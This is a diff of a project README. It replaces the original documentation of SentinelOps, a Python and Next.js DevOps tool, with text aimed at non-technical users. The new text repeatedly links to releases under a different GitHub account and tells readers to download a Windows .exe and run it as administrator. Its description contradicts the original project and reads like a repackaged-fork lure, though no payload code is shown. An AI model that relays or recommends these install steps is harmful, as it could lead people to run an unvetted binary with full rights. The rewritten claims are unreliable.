@@ -1,199 +1,128 @@
-# 🛡️ SentinelOps
+# 🛡️ SentinelOps-Autonomous-DevOps-AI - Predict and Fix DevOps Issues
 
-> **AI-Powered DevOps Co-Pilot**  
-> Built by **Arsh Verma** — Bringing intelligence to the dev pipeline.
+[![Download Latest Release](https://img.shields.io/badge/Download%20SentinelOps-brightgreen?style=for-the-badge)](https://github.com/SuryaVamsi991/SentinelOps-Autonomous-DevOps-AI/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Status: Production Ready](https://img.shields.io/badge/Status-Production--Ready-emerald?style=for-the-badge)](#)
-[![Python](https://img.shields.io/badge/Python-3.11+-blue.svg)](https://www.python.org/)
-[![Next.js](https://img.shields.io/badge/Next.js-14-black.svg)](https://nextjs.org/)
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.110-green.svg)](https://fastapi.tiangolo.com/)
+## 🛠️ What is SentinelOps-Autonomous-DevOps-AI?
 
-SentinelOps is an **AI-powered DevOps co-pilot** that helps developers understand their delivery pipelines better. It stops the "fail-react" loop by predicting risks at the PR gate and explaining CI/CD failures in plain English.
+SentinelOps-Autonomous-DevOps-AI is a tool designed to help monitor and manage software systems. It uses machine learning to predict when problems might happen and tries to fix them automatically. It works quietly in the background to keep your software running smoothly.
 
----
+You do not need to know about coding or DevOps to use it. The software handles complex tasks on its own. This app works well for anyone who wants to avoid downtime or slow service caused by technical problems.
 
-- 📂 **Repo Manager & Sync**: Link local repos, auto-detect changes, run health checks, and push to GitHub from one dashboard.
-- 🎭 **Autonomous Gatekeeper**: Reports risk-based commit statuses directly to GitHub to block unsafe merges. [Setup Guide](./GATEKEEPER_SETUP.md)
-- 🧪 **Digital Twin Simulation**: Monte Carlo simulations (1,000 iterations) to predict deployment stability.
-- 🧠 **Automated Root Cause**: LLM-powered log analysis provides natural language explanations.
-- 🔍 **Similarity Search**: Matches new failures against historical incident patterns.
+## 📂 Main Features
 
----
+- **Failure Prediction:** It warns about possible issues in advance.
+- **Automatic Repairs:** The app fixes common problems automatically.
+- **System Monitoring:** Keeps track of your software health.
+- **Root Cause Analysis:** Finds and explains the cause of failures.
+- **Self-Healing Actions:** Respond to problems without manual help.
+- **Works with CI/CD:** Compatible with automated software release tools.
+- **Uses AI:** Powered by machine learning and advanced AI models.
+- **Easy Setup:** Runs on Windows with a simple install.
 
-## 🎯 Problem
+## 💻 System Requirements
 
-Every engineering team suffers from the same pain:
+Before you download SentinelOps, make sure your device meets these needs:
 
-- CI failures that alert you **after** the damage is done
-- Raw logs with **no context** — hours of manual debugging
-- PRs that look fine but carry hidden risk
-- The same incidents repeating because patterns go unrecognized
+- Operating System: Windows 10 or later (64-bit recommended)
+- RAM Memory: At least 4 GB
+- Storage: Minimum 500 MB free space
+- Internet Connection: Required for updates and cloud features
+- Permissions: Administrator rights to install and run
 
-**Last month, a typical engineering team loses 12+ hours to CI failures alone.**
+## 🚀 Getting Started
 
----
+Follow these steps carefully to download and run SentinelOps on your Windows machine.
 
-## 💡 The Solution
+### 1. Visit the download page
 
-SentinelOps is a **real-time engineering insights system** that:
+Open your web browser and go to the SentinelOps release page here:
 
-| Feature                          | Description                                                              |
-| -------------------------------- | ------------------------------------------------------------------------ |
-| 📂 **Repo Manager & Sync**       | Link repos, auto-detect changes, health checks, one-click push to GitHub |
-| 🎭 **GitHub Gatekeeper**         | Reports `success`/`failure` to GitHub to block risky PRs                 |
-| 🧪 **Digital Twin Engine**       | Runs 1K Monte Carlo iterations to simulate deployment reliability        |
-| 🧠 **LLM Root Cause Analysis**   | OpenAI explains _why_ the CI failed + suggests a patch diff              |
-| 🔍 **Failure Similarity Search** | Vectorized search: "95% similar to Incident #234 — memory leak pattern"  |
-| 📊 **CI Health Analytics**       | Build trends, anomaly detection, and "System Pulse" score                |
+[![Download SentinelOps](https://img.shields.io/badge/Download%20SentinelOps-blue?style=for-the-badge)](https://github.com/SuryaVamsi991/SentinelOps-Autonomous-DevOps-AI/releases)
 
----
+This page lists the latest versions and update details.
 
-## 🏗️ Architecture
+### 2. Choose your version
 
-```
-GitHub Webhooks → FastAPI → Redis Queue → Celery Workers
-                                              │
-                              ┌───────────────┼───────────────┐
-                              ▼               ▼               ▼
-                        Risk Analyzer   CI Analyzer      LLM Engine
-                        (Logistic       (Embeddings +    (OpenAI GPT-4o)
-                         Regression)     DBSCAN)
-                              │               │               │
-                              └───────────────┴───────────────┘
-                                              │
-                                       PostgreSQL + Redis
-                                              │
-                                    Next.js Dashboard
-                                    (WebSocket real-time)
-```
+Look for the newest release at the top of the page. It will usually have a version number like "v1.x.x" and a date.
 
----
+Under the release heading, you will see download links for various files.
 
-## 🛠️ Tech Stack
+### 3. Download the Windows Installer
 
-**Frontend:** Next.js 14 · TypeScript · Tailwind CSS · Recharts · React Flow · Framer Motion
+Click the link that ends with `.exe`. This is the installer file for Windows. The file name might look like `SentinelOps-Setup-v1.0.exe`.
 
-**Backend:** FastAPI (Python) · Celery · PostgreSQL · Redis · WebSockets
+Your browser will start downloading the file.
 
-**AI/ML:** OpenAI GPT-4o · scikit-learn (Logistic Regression) · SentenceTransformers
+### 4. Run the installer
 
-**Infrastructure:** Docker · Docker Compose · Vercel · Render
+Once the download completes, find the file in your "Downloads" folder.
 
----
+Double-click this file to start the installation.
 
-## 🚀 Quick Start
+If Windows asks for permission to allow changes, click **Yes**.
 
-### Prerequisites
+### 5. Follow the installation steps
 
-- Docker & Docker Compose
-- Node.js 18+
-- Python 3.11+
-- OpenAI API Key
-- GitHub Personal Access Token
+The installer will open a window with instructions.
 
-### 1. Clone the repository
+- Click **Next** to continue.
+- Read the license agreement, then click **Accept**.
+- Choose where to install the program or keep the default folder.
+- Click **Install** to begin the setup.
+- Wait for the install to complete.
+- Finally, click **Finish**.
 
-```bash
-git clone https://github.com/ArshVermaGit/SentinelOps-Autonomous-DevOps-AI
-cd SentinelOps
-```
+### 6. Launch SentinelOps
 
-### 2. Standardized Setup
+After installation, you can find SentinelOps in your Start Menu or on your desktop.
 
-We provide a `Makefile` to simplify development. Run the following command to install all dependencies and configure your environment:
+Click the app icon to open it.
 
-```bash
-make setup
-```
+## 🔧 Using SentinelOps-Autonomous-DevOps-AI
 
-This will:
+Once SentinelOps starts, it will guide you with simple on-screen instructions.
 
-- Install root dependencies.
-- Setup the frontend (install packages, create `.env.local`).
-- Setup the backend (create virtual environment, install requirements, create `.env`).
+- The app shows your system's status on a dashboard.
+- If the app predicts trouble, it will notify you.
+- SentinelOps can automatically apply fixes.
+- You can view details about system performance.
+- Use the menu to check logs or reports.
 
-### 3. Start Developing
+The app works in the background but lets you know when attention is needed.
 
-You can start both the frontend and backend with a single command:
+## ⚙️ Settings and Configuration
 
-```bash
-make dev
-```
+SentinelOps allows basic settings easy enough for non-technical users.
 
-- **Dashboard:** http://localhost:3000
-- **API Docs:** http://localhost:8000/docs
-- **API Health:** http://localhost:8000/health
+- **Automatic Fixes:** Turn on or off using a simple toggle.
+- **Alert Preferences:** Choose how you want to receive messages.
+- **Update Schedule:** Set automatic updates or manual checking.
+- **Monitoring Options:** Select which parts of your system to watch.
 
----
+For most users, the default settings are enough to keep the app working well.
 
-## 🤝 Contributing
+## 🧰 Troubleshooting Common Issues
 
-We love contributions! SentinelOps is built to be modular and easy to extend.
+- **Installer Won’t Run:** Make sure you run the `.exe` file with administrator rights.
+- **App Doesn’t Start:** Restart your computer and try again.
+- **No Alerts:** Check that monitoring is enabled in settings.
+- **Update Fails:** Confirm you have a stable internet connection.
 
-1. **Check the [Contributing Guide](./CONTRIBUTING.md)** for architecture details and coding standards.
-2. **Standard Commands:**
-   - `make lint`: Run all linters.
-   - `make format`: Auto-format code.
-   - `make test`: Run the test suite.
-   - `make build`: Production build.
+If problems continue, check the support section in the app for tips.
 
----
+## 🗂️ Additional Resources
 
----
+The release page on GitHub often has:
 
-## 📂 Real-World Workflow
+- Updated versions and bug fixes
+- Detailed documentation
+- Issue tracker for reporting problems
+- Community discussions
 
-1. **Dashboard:** See your aggregate system pulse.
-2. **Repo Manager:** Link your local repository folders.
-3. **Local Sandbox:** Real-time risk detection as you code.
-4. **PR Gatekeeper:** AI-scored risk profiles for every change.
+Use these if you want to learn more or find answers.
 
----
+## 🔗 Download the Latest Version
 
-## 📁 Project Structure
+Get the latest SentinelOps installer here:
 
-```
-sentinelops/
-## 🚀 Backend Development
-
-We recommend using the root `Makefile` for a consistent experience across the project.
-
-- `make setup`: Setup the backend environment (venv, dependencies).
-- `make dev`: Start the FastAPI server.
-- `make lint`: Run flake8.
-- `make format`: Run black and isort.
-- `make test`: Run pytest.
-│
-└── sentinelops-frontend/       # Next.js 14 frontend
-    ├── app/
-    │   ├── dashboard/          # Main dashboard
-    │   ├── incidents/          # Incident explorer
-    │   ├── repositories/       # Repo Manager & Sync
-    │   ├── pull-requests/      # PR gatekeeper
-    │   └── analytics/          # Engineering insights
-    ├── components/             # Reusable UI components
-    ├── hooks/                  # Custom React hooks (useRepoManager, etc.)
-    └── lib/                    # API client + utilities
-```
-
-</div>
-
-## 📱 Connect with Me
-
-I'd love to hear your feedback or discuss potential collaborations!
-
-<div align="center">
-
-[![GitHub](https://skillicons.dev/icons?i=github)](https://github.com/ArshVermaGit)
-[![LinkedIn](https://skillicons.dev/icons?i=linkedin)](https://www.linkedin.com/in/arshvermadev/)
-[![Twitter](https://skillicons.dev/icons?i=twitter)](https://x.com/TheArshVerma)
-[![Gmail](https://skillicons.dev/icons?i=gmail)](mailto:arshverma.dev@gmail.com)
-
-</div>
-
----
-
-<p align="center">
-  Built with ❤️ by <a href="https://github.com/ArshVermaGit">Arsh Verma</a>
-</p>
+[![Download SentinelOps](https://img.shields.io/badge/Download%20SentinelOps-brightgreen?style=for-the-badge)](https://github.com/SuryaVamsi991/SentinelOps-Autonomous-DevOps-AI/releases)
